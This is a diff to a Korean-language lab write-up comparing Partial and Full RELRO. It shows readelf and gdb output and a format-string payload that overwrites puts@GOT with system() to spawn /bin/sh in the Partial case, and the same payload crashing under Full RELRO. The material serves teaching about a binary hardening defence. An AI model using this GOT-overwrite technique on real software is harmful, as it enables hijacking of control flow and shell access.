@@ -439,13 +439,36 @@ $ readelf -S /tmp/relro-lab/relro-partial | egrep ".got|.got.plt"
 
 `.got.plt` 일부는 RELRO 적용을 받지 못하는 범위에 있다.
 
-### 7.2
+### 7.2 Full RELRO
+
+#### Program Header
+
+```
+$ readelf -l /tmp/relro-lab/relro-full | grep GNU_RELRO
+  GNU_RELRO      0x002ed4 0x0804bed4 0x0804bed4 0x0012c 0x0012c R   0x1
+```
+
+0x0804bed4 ~ 0x0804c000에 RELRO가 적용됨을 알 수 있다.
+
+#### Section Header
+
+```
+$ readelf -S /tmp/relro-lab/relro-full | egrep ".got|.got.plt"
+  [21] .got              PROGBITS        0804bfd4 002fd4 00002c 04  WA  0   0  4
+```
+
+`.got.plt`가 따로 보이지 않고 `.got`에 합쳐진 형태로 배치됐다. </br>
+Full RELRO에서는 실행 후 GOT 엔트리를 수정할 일이 없으니 굳이 따로 배치하지 않을 수 있다.
+
+* `.got` 범위: 0x0804bfd4 ~ 0x0804c000
+
+따라서 `.got` 전체가 RELRO 범위에 들어감을 알 수 있다. 
 
 ---
 
-## 7. Partial RELRO
+## 8. Partial RELRO
 
-### 7.1 주소 확인
+### 8.1 주소 확인
 
 puts@GOT: 0804c010
 ```
@@ -471,7 +494,7 @@ Mapped address spaces:
   0xf7fa3000 0xf7fa4000 0x1000   0x231000 rw-p   /usr/lib/i386-linux-gnu/libc.so.6
 ```
 
-### 7.2 FSB offset 확인
+### 8.2 FSB offset 확인
 
 ```
 $ /tmp/relro-lab/relro-partial
@@ -485,7 +508,7 @@ AAAA.80.f7fa35c0.80491e8.41414141.2e78252e
 
 offset = 4
 
-### 7.3 payload 구성
+### 8.3 payload 구성
 
 2바이트씩 쪼개넣기
 
@@ -513,7 +536,7 @@ offset = 4
 %5$hn
 ```
 
-### 7.4 watchpoint로 GOT 변경 확인
+### 8.4 watchpoint로 GOT 변경 확인
 
 ```
 Hardware watchpoint 2: *(int*)0x0804c010
@@ -532,7 +555,7 @@ New value = -136567760
 
 `puts@GOT`에 watchpoint를 설정한 결과, `printf(buf)` 처리 중 GOT 엔트리 값이 변경되는 것을 확인했다.
 
-### 7.5 `puts@plt` → `system` 이동 확인
+### 8.5 `puts@plt` → `system` 이동 확인
 
 ```
 (gdb) c
@@ -554,8 +577,80 @@ GOT overwrite를 통해 함수 호출 흐름을 변경할 수 있음을 확인�
 
 ---
 
-## 8. Full RELRO
+## 9. Full RELRO
+
+### 9.1 주소 확인
+
+바이너리 내의 plt@got의 주소가 달라졌을 수 있으니 이 부분만 새로 확인했다.
+
+puts@GOT: 0804bff0
+```
+$ objdump -R /tmp/relro-lab/relro-full | grep puts
+0804bff0 R_386_JUMP_SLOT   puts@GLIBC_2.0
+```
+
+### 9.2 동일 페이로드 비교
+
+#### `printf(buf)` 진입 전
+``` gdb
+(gdb) c
+Continuing.
+input:
+
+Breakpoint 1, 0x0804922c in main ()
+(gdb) x/wx 0x0804bff0
+0x804bff0 <puts@got.plt>:	0xf7dea140
+```
+
+#### `printf(buf)` 진입 후
+
+```
+(gdb) ni
+
+...
+                 
+Program received signal SIGSEGV, Segmentation fault.
+0xf7dd22dd in printf_positional (buf=buf@entry=0xffffcd40, 
+    format=format@entry=0xffffce30 "\360\277\004\b\362\277\004\b%9256c%4$hn%54188c%5$hn", 
+    readonly_format=readonly_format@entry=0, ap=<optimized out>, 
+    ap_savep=<optimized out>, nspecs_done=1, lead_str_end=<optimized out>, 
+    work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, 
+    thousands_sep=<optimized out>, mode_flags=<optimized out>)
+    at ./stdio-common/vfprintf-process-arg.c:350
+warning: 350	./stdio-common/vfprintf-process-arg.c: No such file or directory
+```
+
+Full RELRO 바이너리에 동일한 payload를 입력하면,
+`printf(buf)` 내부에서 `%hn`을 처리하며 `puts@GOT`에 쓰기를 시도한다.
+
+하지만 Full RELRO에서는 relocation 완료 후 GOT 영역이 read-only로 변경되므로, 쓰기 시도 시 SIGSEGV가 발생한다.
+
+```
+(gdb) x/wx 0x0804bff0
+0x804bff0 <puts@got.plt>:	0xf7dea140
+```
+
+`puts@GOT` 값을 확인하면, 실행 전후 모두 동일한 값으로 유지됨을 확인할 수 있다.
+
+따라서 Full RELRO 상태에서는 GOT overwrite가 차단됨을 확인할 수 있다.
 
 ---
 
-## 9. 정리
+## 10. 정리
+
+| 항목               | Partial RELRO | Full RELRO               |
+| ---------------- | ------------- | ------------------------ |
+| Binding 방식       | Lazy Binding  | Eager Binding (`-z now`) |
+| Relocation 수행 시점 | 함수가 처음 호출될 때  | 프로그램 시작 시                |
+| `.got.plt`       | Writable      | Read-Only                |
+| GOT 수정           | 가능            | 불가능                      |
+| GOT overwrite    | 가능            | 불가능                      |
+| 공격 결과            | 제어 흐름 변경 가능   | SIGSEGV 발생               |
+
+이번 실습에서는 동일한 FSB 취약점과 동일한 payload를 사용하여 두 바이너리를 비교하였다.
+
+Partial RELRO에서는 `puts@GOT`를 `system()`으로 덮어써 `puts("/bin/sh")` 호출이 `system("/bin/sh")`으로 변경되었다.
+
+반면 Full RELRO에서는 relocation이 완료된 뒤 GOT가 읽기 전용으로 변경되므로, 동일한 payload로 GOT에 쓰기를 시도하는 순간 SIGSEGV가 발생하였다.
+
+즉, Partial RELRO와 Full RELRO의 차이는 **GOT를 실행 중에도 수정해야 하는지 여부**이며, Full RELRO는 이를 이용한 GOT overwrite 공격을 효과적으로 차단한다.
